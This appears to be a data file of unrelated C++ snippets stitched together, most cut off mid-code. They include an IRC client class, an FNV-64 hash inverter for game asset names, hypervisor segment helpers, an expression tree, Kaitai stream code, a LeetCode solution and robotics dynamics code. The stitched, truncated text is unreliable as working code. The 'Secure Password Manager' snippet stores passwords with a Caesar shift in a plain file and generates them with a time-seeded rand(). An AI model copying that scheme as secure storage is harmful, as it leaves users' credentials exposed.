0)\n\t\t\t\tChannel::removeChannel((*iter)->getName());\n\t\t}\n\t}\n}\n\nvoid Client::changeNick(std::string nick)\n{\t\n\tstd::vector<std::string>& nickList = Server::getNickList();\n\n\t// old nickname \uc18c\ubb38\uc790\ub85c \ubcc0\ud658\n\tstd::string oldLower;\n\tfor (int i = 0; i < static_cast<int>(nickname.size()); i++)\n\t\toldLower += tolower(nickname[i]);\n\t// new nickname \uc18c\ubb38\uc790\ub85c \ubcc0\ud658\n\tstd::string newLower;\n\tfor (int i = 0; i < static_cast<int>(nick.size()); i++)\n\t\tnewLower += tolower(nick[i]);\n\n\t// nickList\uc5d0\uc11c old nickname \ucc3e\uae30\n\tstd::vector<std::string>::iterator nickIter = find(nickList.begin(), nickList.end(), oldLower);\n\t// old nickname \uc5d0\uc11c new nickname \uc73c\ub85c \ubcc0\ud658\n\t*nickIter = newLower;\n\n\n\t// \uac19\uc740 \ucc44\ub110\uc5d0 \uc788\ub294 nickname\uc758 fd \ub4e4\uc744 set\uc5d0 \uc800\uc7a5\n\tstd::set<int> set;\n\tset.insert(fd);\n\tstd::vector<Channel*>::iterator channelIter = joinedChannels.begin();\n\tfor (; channelIter != joinedChannels.end(); channelIter++)\n\t\t(*channelIter)->changeNickInChannel(*this, nick, set);\n\t\n\t// nickname \ubcc0\uacbd \uba54\uc2dc\uc9c0 \ub9cc\ub4e4\uae30\n\tstd::string msgStr = ServerMsg::NICKCHANGE(nickname, data.hostname, data.servername, nick);\n\tconst char *msg = msgStr.c_str();\n\t\n\t// set\uc5d0 \uc788\ub294 \uac19\uc740 \ucc44\ub110\uc5d0 \uc788\ub294 client\ub4e4\uc758 fd\uc5d0 \uba54\uc2dc\uc9c0 \uc804\uc1a1\n\tstd::set<int>::iterator setIter = set.begin();\n\tfor (; setIter != set.end(); setIter++)\n\t\tsend(*setIter, msg, msgStr.size(), 0);\n\n\t// nickname \ubcc0\uacbd\n\tnickname = nick;\n}\n\n// \uba54\uc2dc\uc9c0 \ubcf4\ub0b4\ub294 \ud568\uc218\n\nvoid Client::sendMsg(std::string msg)\n{\n\tstd::cout << \"send to client : \" << msg;\n\tsend(fd, msg.c_str(), msg.size(), 0);\n}\n\n\n// channel \ud568\uc218\nbool Client::isClientMemberOfChannel(std::string& channel)\n{\n\t// channelList\uc758 nick \ubcc0\uacbd\n\tstd::vector<Channel*>::iterator iter = joinedChannels.begin();\n\tfor (; iter != joinedChannels.end(); iter++)\n\t{\n\t\tif ((*iter)->getName() == channel)\n\t\t\treturn (true);\n\t}\n\treturn (false);\n}\n\nvoid Client::addJoinedChannels(Channel* channel)\n{\n\tjoinedChannels.push_back(channel);\n}\n\nvoid Client::removeJoinedChannels(Channel* channel)\n{\n\tjoinedChannels.erase(find(joinedChannels.begin(), joinedChannels.end(), channel));\n}\n\n\n// getter\n\nClient& Client::getClient(std::string& nick)\n{\n\tstd::map<int, Client>& clientList = Server::getClientList();\n\n\tstd::map<int, Client>::iterator iter = clientList.begin();\n\tfor (; iter != clientList.end(); iter++)\n\t{\n\t\tif (iter->second.getNick() == n",
    "/*\n*\n* This is just an old file I had for testing, it still has some code I want to port for multitheading\n* so it will not yet be deleted\n*\n*/\n\n\n/*\n#include \"fplll.h\"\n#include <iomanip>\n\n// changes a lot depending on what you're trying to crack\nconstexpr uint64_t OFFSET_BASIS = 0x79D6530B0BB9B5D1;\n\n// These are the only two primes COD uses (as far as I know)\nconstexpr uint64_t PRIME = 0x10000000233; // will crack 8 char plaintext with around 54% accuracy\n// constexpr uint64_t PRIME = 0x100000001B3; // will crack 8 char plaintext with around 93% accuracy\n\n// may occasionally change to 63\nconstexpr uint32_t BIT_LEN = 64;\nstatic_assert(BIT_LEN <= 64, \"The hard maximum on the BIT_LEN value is 64\");\n\nuint64_t fnv64(const char* string) {\n    uint64_t hash = OFFSET_BASIS;\n    constexpr uint64_t prime = PRIME;\n    for (int i = 0; string[i] && string[i] != '\\n'; ++i) {\n        char cur = string[i];\n        if ((unsigned char)(cur - 'A') <= 25)\n            cur |= 0x20;\n\n        if (cur == '\\\\')\n            cur = '/';\n\n        hash ^= cur;\n        hash *= prime;\n    }\n\n    if constexpr (BIT_LEN != 64) {\n        return hash % (1ULL << BIT_LEN);\n    } else {\n        return hash;\n    }\n}\n\nuint64_t fnv64(const string& string) {\n    uint64_t hash = OFFSET_BASIS;\n    constexpr uint64_t prime = PRIME;\n    for (const char& chr : string) {\n        char cur = chr;\n        if ((unsigned char)(cur - 'A') <= 25)\n            cur |= 0x20;\n\n        if (cur == '\\\\')\n            cur = '/';\n\n        hash ^= cur;\n        hash *= prime;\n    }\n\n    if constexpr (BIT_LEN != 64) {\n        return hash % (1ULL << BIT_LEN);\n    } else {\n        return hash;\n    }\n}\n\nstd::tuple<Z_NR<mpz_t>, Z_NR<mpz_t>, Z_NR<mpz_t>>\ngcd_extended(Z_NR<mpz_t> a, Z_NR<mpz_t> b) {\n    if (a == 0) {\n        Z_NR<mpz_t> ra, rb;\n        mpz_set_ui(ra.get_data(), 0UL);\n        mpz_set_ui(rb.get_data(), 1UL);\n        return make_tuple(b, ra, rb);\n    }\n\n    Z_NR<mpz_t> tmp_b, x;\n    tmp_b.mod(b, a);\n    auto [gcd, x1, y1] = gcd_extended(tmp_b, a);\n    mpz_div(b.get_data(), b.get_data(), a.get_data());\n    b.mul(b, x1);\n    x.sub(y1, b);\n    return make_tuple(gcd, x, x1);\n}\n\ntemplate <unsigned long long prime, uint32_t exp>\nuint64_t inverse() {\n    static once_flag flag{};\n    static uint64_t result;\n    call_once(flag, [&]() {\n        Z_NR<mpz_t> mpz_exp, mpz_prime, tmp;\n        mpz_ui_pow_ui(mpz_exp.get_data(), 2U, exp);\n        mpz_set_ui(mpz_prime.get_data(), prime);\n\n        auto ret = gcd_extended(mpz_prime, mpz_exp);\n        tmp.mod(std::get<1>(ret), mpz_exp);\n        result = mpz_get_ui(tmp.get_data());\n        if constexpr (exp != 64) {\n            result %= 1ULL << exp;\n        }\n    });\n\n    return result;\n}\n\nvector<string>& product(const string_view& chars, int repeat) {\n    static unordered_map<int, vector<string>> cache;\n    \n    auto it = cache.find(repeat);\n    if (it != cache.end())\n        return it->second;\n    \n    vector<string> result;\n    function<void(int, string)> generate = [&](int depth, string current) {\n        if (depth == 0) {\n            result.push_back(current);\n            return;\n        }\n        \n        for (const char c : chars)\n            generate(depth - 1, current + c);\n    };\n    \n    generate(repeat, \"\");\n    cache[repeat] = result;    \n    return cache[repeat];\n}\n\ninline Z_NR<mpz_t> pow(const Z_NR<mpz_t>& base, unsigned int exponent) {\n    Z_NR<mpz_t> result;\n    mpz_pow_ui(result.get_data(), base.get_data(), exponent);\n    return result;\n}\n\nbool solve(\n    string& result,\n    const uint64_t target,\n    const uint32_t expected_len,\n    const uint32_t brute = 0,\n    const string& prefix = \"\",\n    const string& suffix = \"\"\n) {\n    Z_NR<mpz_t> MOD, p;\n    mpz_ui_pow_ui(MOD.get_data(), 2U, BIT_LEN); // 2 ** BIT_LEN\n    mpz_set_ui(p.get_data(), PRIME);\n\n    // change according to whatever youre working with\n    const string valid_charset = valid_func;\n\n    const uint32_t nn = expected_len - brute - prefix.size() - suffix.size();\n    const uint32_t dim = nn + 2;\n\n    uint64_t P = 1;\n    for (int i = 0; i < nn; ++i)\n        P *= PRIME;\n    \n    if constexpr (BIT_LEN != 64) {\n        P %= 1ULL << BIT_LEN;\n    }\n\n    Z_NR<mpz_t> start;\n    mpz_set_ui(start.get_data(), 1ULL << 12); // 2 ** 12\n\n    ZZ_mat<mpz_t> Q(dim, dim);\n    Q(0, 0) = start;\n    for (int i = 1; i < dim - 1; ++i)\n        Q(i, i) = 1ULL << 4; // 2 ** 4\n    Q(dim - 1, dim - 1) = 1ULL << 10; // 2 ** 10\n\n    // identity matrix but with an extra column on the left and extra row on the bottom\n    ZZ_mat<mpz_t> _M(dim, dim);\n    for (int i = 0; i <= nn; ++i)\n        _M(i, i+1) = 1;\n\n    // fill in extra column on the left\n    // (except second to last val)\n    for (int i = 0; i < nn; ++i)\n        _M(i, 0) = pow(p, nn - i);\n    _M(dim - 1, 0) = MOD;\n\n    uint64_t ntarget = target;\n    for (int i = suffix.size() - 1; i >= 0; --i) {\n        ntarget *= inverse<PRIME, BIT_LEN>();\n        ntarget ^= suffix.at(i);\n    }\n\n    string ret = \"\";\n    if constexpr (BIT_LEN != 64) {\n   ",
    "#include \"gdt.hpp\"\n\nnamespace gdt\n{\n\tauto get_access_rights(segment_descriptor_64* segment_descriptor) -> vmx_segment_access_rights\n\t{\n\t\tvmx_segment_access_rights result;\n\t\tresult.flags = NULL;\n\n\t\tresult.granularity = segment_descriptor->granularity;\n\t\tresult.type = segment_descriptor->type;\n\t\tresult.descriptor_type = segment_descriptor->descriptor_type;\n\t\tresult.present = segment_descriptor->present;\n\t\tresult.long_mode = segment_descriptor->long_mode;\n\t\tresult.available_bit = segment_descriptor->system;\n\t\tresult.default_big = segment_descriptor->default_big;\n\t\tresult.descriptor_privilege_level = segment_descriptor->descriptor_privilege_level;\n\t\tresult.unusable = !segment_descriptor->present;\n\t\treturn result;\n\t}\n\n\tauto get_info(const segment_descriptor_register_64& gdt_value, segment_selector selector) -> hv::segment_info_ctx\n\t{\n\t\thv::segment_info_ctx segment_info{};\n\n\t\tconst auto segment_descriptor =\n\t\t\treinterpret_cast<segment_descriptor_64*>(\n\t\t\t\tgdt_value.base_address + (selector.idx << SEGMENT_SELECTOR_INDEX_BIT));\n\n\t\t// access rights are spread out over the segment \n\t\t// descriptor so those need to picked out and assigned \n\t\t// to the vmx segment access rights variable...\n\t\tsegment_info.limit = __segmentlimit(selector.flags);\n\t\tsegment_info.rights = get_access_rights(segment_descriptor);\n\t\tsegment_info.segment_descriptor = *segment_descriptor;\n\n\t\t// base address of a segment is spread over the segment descriptor in 3 places. 2 parts of the \n\t\t// address are 8 bits each (1 byte each) and the lowest part of the address is 2 bytes (4 bytes in total)...\n\t\t// by shifting the values to the correct bit offset and adding them all together we get the address...\n\t\tsegment_info.base_addr = (u32)((segment_descriptor->base_address_high << SEGMENT__BASE_ADDRESS_HIGH_BIT) +\n\t\t\t(segment_descriptor->base_address_middle << SEGMENT__BASE_ADDRESS_MIDDLE_BIT) +\n\t\t\t\t(segment_descriptor->base_address_low));\n\n\t\t// Example:\n\t\t//\t- high bits:\t0b1111 0000 0000 0000\n\t\t//\t- middle bits:\t0b0000 1111 0000 0000\n\t\t//\t- low bits:\t\t0b0000 0000 1011 1000\n\t\t//\t\t\t\t\t--------------------- +\n\t\t//\t\t\t\t\t0b1111 1111 1011 1000 <==== full address...\n\t\t// if you add all of these together you will get the full address...\n\n\t\t// if the base address is 64bits then go ahead \n\t\t// and add the top 32bits onto the address..\n\t\tif (!segment_descriptor->descriptor_type)\n\t\t\tsegment_info.base_addr += ((u64)segment_descriptor->base_address_upper << SEGMENT__BASE_ADDRESS_SHIFT);\n\n\t\treturn segment_info;\n\t}\n}",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n#define max 20\r\n\r\nstruct node{\r\n    char data;\r\n    struct node* left;\r\n    struct node* right;\r\n};\r\n\r\nclass cstack{\r\n    int top;\r\n    node *exp[max];\r\n    public:\r\n    cstack()\r\n    {\r\n        top=-1;\r\n    }\r\n    int isEmpty()\r\n    {\r\n        if(top==-1)\r\n        {\r\n            return 1;\r\n        }\r\n        else\r\n        {\r\n            return 0;\r\n        }\r\n    }\r\n    int isFull()\r\n    {\r\n        if(top==max-1)\r\n        {\r\n            return 1;\r\n        }\r\n        else\r\n        {\r\n            return 0;\r\n        }\r\n    }\r\n    void push(node *t)\r\n    {\r\n        if(isFull()==1)\r\n        {\r\n            cout<<\"Stack is full\"<<endl;\r\n        }\r\n        else\r\n        {\r\n            top++;\r\n            exp[top]=t;\r\n        }\r\n    }\r\n    struct node *pop()\r\n    {\r\n        if(isEmpty()==1)\r\n        {\r\n            cout<<\"stack is empty\"<<endl;\r\n        }\r\n        else\r\n        {\r\n            node *t;\r\n            t=exp[top];\r\n            top--;\r\n            return t;\r\n        }\r\n    }\r\n};\r\n\r\nclass expTree{\r\n    struct node *top;\r\n    public:\r\n    struct node *expression(string);\r\n    void display(node*);\r\n    void postorder(node*);\r\n    void del(node*);\r\n};\r\n\r\nstruct node* expTree::expression(string prefix)\r\n{\r\n    int len;\r\n    len=prefix.length();\r\n    cstack s1,s2;\r\n    for(int i=len;i >= 0;i--)\r\n    {\r\n        top=new node;\r\n        top->left=NULL;\r\n        top->right=NULL;\r\n\r\n        if(isalpha(prefix[i]))\r\n        {\r\n            top->data=prefix[i];\r\n            s1.push(top);\r\n        }\r\n        else\r\n        {\r\n            if(prefix[i]=='+' || prefix[i]=='-' || prefix[i]=='/' || prefix[i]=='*')\r\n            {\r\n                node *t1,*t2;\r\n                t1=s1.pop();\r\n                t2=s1.pop();\r\n                top->data=prefix[i];\r\n                top->left=t1;\r\n                top->right=t2;\r\n                s1.push(top);\r\n            }\r\n        }\r\n    }\r\n    return top;\r\n}\r\n\r\nvoid expTree::postorder(node *top)\r\n{\r\n    cstack s1,s2;\r\n    node *t=top;\r\n    s1.push(t);\r\n    while(!s1.isEmpty())\r\n    {\r\n        t=s1.pop();\r\n        s2.push(t);\r\n        if(t->left != NULL)\r\n        {\r\n            s1.push(t->left);\r\n        }\r\n        if(t->right != NULL)\r\n        {\r\n            s1.push(t->right);\r\n        }\r\n    }\r\n\r\n    while(s2.isEmpty() != 1)\r\n    {\r\n        node *temp2;\r\n        temp2=s2.pop();\r\n        cout<<temp2->data;\r\n    }\r\n    cout<<endl;\r\n}\r\n\r\nvoid expTree::display(node *root)\r\n{\r\n    if(root != NULL)\r\n    {\r\n        display(root->left);\r\n        display(root->right);\r\n        cout<<root->data;\r\n    }\r\n}\r\n\r\nvoid expTree::del(node *t)\r\n{\r\n    if(t==NULL)\r\n    {\r\n        return;\r\n    }\r\n    else\r\n    {\r\n        del(t->left);\r\n        del(t->right);\r\n        delete(t);\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    string exp;\r\n    cout<<\"Enter :\";\r\n    cin>>exp;\r\n    expTree e1;\r\n    struct node *top=NULL;\r\n\r\n    top=e1.expression(exp);\r\n    e1.postorder(top);\r\n    e1.display(top);\r\n    e1.del(top);\r\n    return 0;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"password_strength_validator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <kaitai/kaitaistream.h>\n#include <kaitai/exceptions.h>\n\n#if defined(__APPLE__)\n#include <machine/endian.h>\n#include <libkern/OSByteOrder.h>\n#define bswap_16(x) OSSwapInt16(x)\n#define bswap_32(x) OSSwapInt32(x)\n#define bswap_64(x) OSSwapInt64(x)\n#define __BYTE_ORDER    BYTE_ORDER\n#define __BIG_ENDIAN    BIG_ENDIAN\n#define __LITTLE_ENDIAN LITTLE_ENDIAN\n#elif defined(_MSC_VER) // !__APPLE__\n#include <stdlib.h>\n#define __LITTLE_ENDIAN     1234\n#define __BIG_ENDIAN        4321\n#define __BYTE_ORDER        __LITTLE_ENDIAN\n#define bswap_16(x) _byteswap_ushort(x)\n#define bswap_32(x) _byteswap_ulong(x)\n#define bswap_64(x) _byteswap_uint64(x)\n#elif defined(__QNX__) // __QNX__\n#include <sys/param.h>\n#include <gulliver.h>\n#define bswap_16(x) ENDIAN_RET16(x)\n#define bswap_32(x) ENDIAN_RET32(x)\n#define bswap_64(x) ENDIAN_RET64(x)\n#define __BYTE_ORDER    BYTE_ORDER\n#define __BIG_ENDIAN    BIG_ENDIAN\n#define __LITTLE_ENDIAN LITTLE_ENDIAN\n#else // !__APPLE__ or !_MSC_VER or !__QNX__\n#include <endian.h>\n#include <byteswap.h>\n#endif\n\n#include <iostream>\n#include <vector>\n#include <stdexcept>\n\nkaitai::kstream::kstream(std::istream *io) {\n    m_io = io;\n    init();\n}\n\nkaitai::kstream::kstream(const std::string &data) : m_io_str(data) {\n    m_io = &m_io_str;\n    init();\n}\n\nvoid kaitai::kstream::init() {\n    exceptions_enable();\n    align_to_byte();\n}\n\nvoid kaitai::kstream::close() {\n    //  m_io->close();\n}\n\nvoid kaitai::kstream::exceptions_enable() const {\n    m_io->exceptions(\n        std::istream::eofbit |\n        std::istream::failbit |\n        std::istream::badbit\n    );\n}\n\n// ========================================================================\n// Stream positioning\n// ========================================================================\n\nbool kaitai::kstream::is_eof() const {\n    if (m_bits_left > 0) {\n        return false;\n    }\n    char t;\n    m_io->exceptions(std::istream::badbit);\n    m_io->get(t);\n    if (m_io->eof()) {\n        m_io->clear();\n        exceptions_enable();\n        return true;\n    } else {\n        m_io->unget();\n        exceptions_enable();\n        return false;\n    }\n}\n\nvoid kaitai::kstream::seek(uint64_t pos) {\n    m_io->seekg(pos);\n}\n\nuint64_t kaitai::kstream::pos() {\n    return m_io->tellg();\n}\n\nuint64_t kaitai::kstream::size() {\n    std::iostream::pos_type cur_pos = m_io->tellg();\n    m_io->seekg(0, std::ios::end);\n    std::iostream::pos_type len = m_io->tellg();\n    m_io->seekg(cur_pos);\n    return len;\n}\n\n// ========================================================================\n// Integer numbers\n// ========================================================================\n\n// ------------------------------------------------------------------------\n// Signed\n// ------------------------------------------------------------------------\n\nint8_t kaitai::kstream::read_s1() {\n    char t;\n    m_io->get(t);\n    return t;\n}\n\n// ........................................................................\n// Big-endian\n// ........................................................................\n\nint16_t kaitai::kstream::read_s2be() {\n    int16_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 2);\n#if __BYTE_ORDER == __LITTLE_ENDIAN\n    t = bswap_16(t);\n#endif\n    return t;\n}\n\nint32_t kaitai::kstream::read_s4be() {\n    int32_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 4);\n#if __BYTE_ORDER == __LITTLE_ENDIAN\n    t = bswap_32(t);\n#endif\n    return t;\n}\n\nint64_t kaitai::kstream::read_s8be() {\n    int64_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 8);\n#if __BYTE_ORDER == __LITTLE_ENDIAN\n    t = bswap_64(t);\n#endif\n    return t;\n}\n\n// ........................................................................\n// Little-endian\n// ........................................................................\n\nint16_t kaitai::kstream::read_s2le() {\n    int16_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 2);\n#if __BYTE_ORDER == __BIG_ENDIAN\n    t = bswap_16(t);\n#endif\n    return t;\n}\n\nint32_t kaitai::kstream::read_s4le() {\n    int32_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 4);\n#if __BYTE_ORDER == __BIG_ENDIAN\n    t = bswap_32(t);\n#endif\n    return t;\n}\n\nint64_t kaitai::kstream::read_s8le() {\n    int64_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 8);\n#if __BYTE_ORDER == __BIG_ENDIAN\n    t = bswap_64(t);\n#endif\n    return t;\n}\n\n// ------------------------------------------------------------------------\n// Unsigned\n// ------------------------------------------------------------------------\n\nuint8_t kaitai::kstream::read_u1() {\n    char t;\n    m_io->get(t);\n    return t;\n}\n\n// ........................................................................\n// Big-endian\n// ........................................................................\n\nuint16_t kaitai::kstream::read_u2be() {\n    uint16_t t;\n    m_io->read(reinterpret_cast<char *>(&t), 2);\n#if __BYTE_ORDER == __LITTLE_ENDIAN\n    t = bswap_16(t);\n#endif\n    return t;\n}\n\nuint32_t kaitai::kstream::read_u4be() {\n    uint32_t t;\n    m_io->read(re",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <algorithm>\r\n#include <cctype>\r\n#include <map>\r\n#include <sstream>\r\n#include <limits> \r\n#include <stdexcept> \r\n\r\nstd::string generateRandomPassword(int length) {\r\n    const std::string charset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+\";\r\n    std::string password;\r\n    std::srand(static_cast<unsigned int>(std::time(nullptr)));\r\n    for (int i = 0; i < length; ++i) {\r\n        password += charset[std::rand() % charset.size()];\r\n    }\r\n    return password;\r\n}\r\n\r\nstd::string encrypt(const std::string& text, int key) {\r\n    std::string result = text;\r\n    for (char& c : result) {\r\n        if (std::isalpha(c)) {\r\n            char base = std::isupper(c) ? 'A' : 'a';\r\n            c = (c - base + key) % 26 + base;\r\n        }\r\n    }\r\n    return result;\r\n}\r\n\r\nstd::string decrypt(const std::string& text, int key) {\r\n    return encrypt(text, 26 - key);\r\n}\r\n\r\nvoid storePassword(const std::string& site, const std::string& username, const std::string& password) {\r\n    std::ofstream file(\"C:\\\\mang.txt\", std::ios::app);\r\n    if (file.is_open()) {\r\n        std::string encryptedSite = encrypt(site, 3);\r\n        std::string encryptedUsername = encrypt(username, 3);\r\n        std::string encryptedPassword = encrypt(password, 3);\r\n        file << encryptedSite << \" \" << encryptedUsername << \" \" << encryptedPassword << std::endl;\r\n        std::cout << \"Password stored successfully.\" << std::endl;\r\n    }\r\n    else {\r\n        std::cerr << \"Error: Unable to open file for storing password.\" << std::endl;\r\n        system(\"cls\");\r\n    }\r\n}\r\n\r\nstd::map<std::string, std::pair<std::string, std::string>> retrievePasswords() {\r\n    std::ifstream file(\"C:\\\\mang.txt\");\r\n    std::map<std::string, std::pair<std::string, std::string>> passwords;\r\n    if (file.is_open()) {\r\n        std::string line;\r\n        while (std::getline(file, line)) {\r\n            std::istringstream iss(line);\r\n            std::string encryptedSite, encryptedUsername, encryptedPassword;\r\n            if (iss >> encryptedSite >> encryptedUsername >> encryptedPassword) {\r\n                std::string site = decrypt(encryptedSite, 3);\r\n                std::string username = decrypt(encryptedUsername, 3);\r\n                std::string password = decrypt(encryptedPassword, 3);\r\n                passwords[site] = std::make_pair(username, password);\r\n            }\r\n        }\r\n    }\r\n    else {\r\n        std::cerr << \"Error: Unable to open password file for retrieval.\" << std::endl;\r\n    }\r\n    return passwords;\r\n}\r\n\r\nvoid clearScreen() {\r\n#ifdef _WIN32\r\n    system(\"cls\");\r\n#else\r\n    system(\"clear\");\r\n#endif\r\n}\r\n\r\nint main() {\r\n    int choice;\r\n    std::map<std::string, std::pair<std::string, std::string>> passwords;\r\n    do {\r\n        clearScreen();\r\n        passwords = retrievePasswords();\r\n        std::cout << \"\\nSecure Password Manager\\n\";\r\n        std::cout << \"1. Store New Password\\n\";\r\n        std::cout << \"2. Retrieve Password\\n\";\r\n        std::cout << \"3. Generate Random Password\\n\";\r\n        std::cout << \"4. Exit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\r\n\r\n        switch (choice) {\r\n        case 1: {\r\n            std::string site, username, password;\r\n            std::cout << \"Enter website or service name: \";\r\n            std::getline(std::cin, site);\r\n            std::cout << \"Enter username: \";\r\n            std::getline(std::cin, username);\r\n            std::cout << \"Enter password: \";\r\n            std::getline(std::cin, password);\r\n            storePassword(site, username, password);\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 2: {\r\n            std::string site;\r\n            std::cout << \"Enter website or service name: \";\r\n            std::getline(std::cin, site);\r\n            auto it = passwords.find(site);\r\n            if (it != passwords.end()) {\r\n                std::cout << \"Username: \" << it->second.first << std::endl;\r\n                std::cout << \"Password: \" << it->second.second << std::endl;\r\n            }\r\n            else {\r\n                std::cout << \"Password not found for the given site.\" << std::endl;\r\n            }\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 3: {\r\n            int length;\r\n            std::cout << \"Enter password length: \";\r\n            std::cin >> length;\r\n            std::cout << \"Generated Password: \" << generateRandomPassword(length) << std::endl;\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 4:\r\n            std::cout << \"Exi",
    "// Company Tags                : GOOGLE\n// Leetcode Link               : https://leetcode.com/problems/find-the-safest-path-in-a-grid/description/\n\n#include <iostream>\n#include <algorithm>\n#include <vector>\n#include <queue>\nusing namespace std;\n\nclass Solution {\npublic:\n    int n;\n    \n    vector<vector<int>> directions{{1, 0}, {-1, 0}, {0, -1}, {0, 1}};\n\n    bool check(vector<vector<int>>& distNearestThief, int sf) {\n        queue<pair<int, int>> que;\n\n        vector<vector<bool>> visited(n, vector<bool>(n, false));\n        //0,0 --> n-1, n-1\n        que.push({0, 0});\n        visited[0][0] = true;\n\n        if(distNearestThief[0][0] < sf)\n            return false;\n\n        while(!que.empty()) {\n            int curr_i = que.front().first;\n            int curr_j = que.front().second;\n\n            que.pop();\n\n            if(curr_i == n-1 && curr_j == n-1) {\n                return true;\n            }\n\n            for(vector<int>& dir : directions) {\n                int new_i = curr_i + dir[0];\n                int new_j = curr_j + dir[1];\n\n                if(new_i >= 0 && new_i < n && new_j >= 0 && new_j < n && visited[new_i][new_j] != true) {\n                    if(distNearestThief[new_i][new_j] < sf) {\n                        continue; //reject this cell\n                    }\n                    que.push({new_i, new_j});\n                    visited[new_i][new_j] = true;\n                }\n\n            }\n        }\n\n        return false;\n        \n    }\n\n    int maximumSafenessFactor(vector<vector<int>>& grid) {\n        n = grid.size();\n\n        //Step-1 Precalculation of distNearestThief - for each cell\n        vector<vector<int>> distNearestThief(n, vector<int>(n, -1));\n        queue<pair<int, int>> que;\n        vector<vector<bool>> visited(n, vector<bool>(n, false));\n\n        //push all cells in queue where theives are present\n        for(int i = 0; i < n; i++) {\n            for(int j = 0; j < n; j++) {\n                if(grid[i][j] == 1) {\n                    que.push({i, j});\n                    visited[i][j] = true;\n                }\n            }\n        }\n\n        int level = 0;\n        while(!que.empty()) {\n            int size = que.size();\n\n            while(size--) {\n                int curr_i = que.front().first;\n                int curr_j = que.front().second;\n                que.pop();\n                distNearestThief[curr_i][curr_j] = level;\n                for(vector<int>& dir : directions) {\n                    int new_i = curr_i + dir[0];\n                    int new_j = curr_j + dir[1];\n\n                    if(new_i < 0 || new_i >= n || new_j < 0 || new_j >= n || visited[new_i][new_j]) {\n                        continue;\n                    }\n\n                    que.push({new_i, new_j});\n                    visited[new_i][new_j] = true;\n\n                }\n\n            }\n            level++;\n        }\n\n        //Step-2 Apply binary search on SF\n        int l = 0;\n        int r = 400;\n        int result = 0;\n\n        while(l <= r) {\n            int mid_sf = l + (r-l)/2;\n\n            if(check(distNearestThief, mid_sf)) {\n                result = mid_sf;\n                l = mid_sf+1;\n            } else {\n                r = mid_sf-1;\n            }\n        }\n\n        return result;\n        \n    }\n};\nint main() {\n    Solution s;\n    vector<vector<int>> grid {\n        {1, 0, 0},\n        {0, 0, 0},\n        {0, 0, 1}\n    };\n\n    cout << s.maximumSafenessFactor(grid);\n    return 0;\n}",
    "#include \"srbd.hpp\"\n\n#include <proxsuite/proxqp/dense/dense.hpp>\n\nnamespace srbd {\n    using qp_t = proxsuite::proxqp::dense::QP<double>;\n    using qp_mat_t = proxsuite::proxqp::dense::Mat<double>;\n    using qp_vec_t = proxsuite::proxqp::dense::Vec<double>;\n\n    SingleRigidBodyDynamics::SingleRigidBodyDynamics(const SingleRigidBodyDynamics& other)\n    {\n        // TO-DO: This is not the best way to handle this!! BUT should be okay for now..\n        operator=(other);\n    }\n\n    SingleRigidBodyDynamics& SingleRigidBodyDynamics::operator=(const SingleRigidBodyDynamics& other)\n    {\n        // COM state\n        _base_position = other._base_position;\n        _base_vel = other._base_vel;\n        _base_orientation = other._base_orientation;\n        _base_angular_vel = other._base_angular_vel;\n\n        // Feet state\n        _feet_positions = other._feet_positions;\n        _feet_phases = other._feet_phases;\n\n        // Static ref poses/bounds\n        _feet_ref_positions = other._feet_ref_positions;\n        _feet_min_bounds = other._feet_min_bounds;\n        _feet_max_bounds = other._feet_max_bounds;\n\n        // Phase Handler\n        _phase_handler = std::move(other._phase_handler->clone());\n\n        // Terrain\n        _terrain = std::move(other._terrain->clone());\n\n        // General state\n        _mass = other._mass;\n        _inertia = other._inertia;\n        _inertia_inv = other._inertia_inv;\n\n        // Global variables\n        _dt = other._dt;\n        _g = other._g;\n        _gravity = other._gravity;\n\n        // Helper variables\n        _last_qp_result_valid = other._last_qp_result_valid;\n\n        return *this;\n    }\n\n    void SingleRigidBodyDynamics::set_sim_data(double dt, double gravity)\n    {\n        _dt = dt;\n        _g = std::abs(gravity);\n        _gravity = Vec3d(0, 0, -_g);\n    }\n\n    void SingleRigidBodyDynamics::set_inertial_data(double mass, const RotMat& inertia)\n    {\n        _mass = mass;\n        _inertia 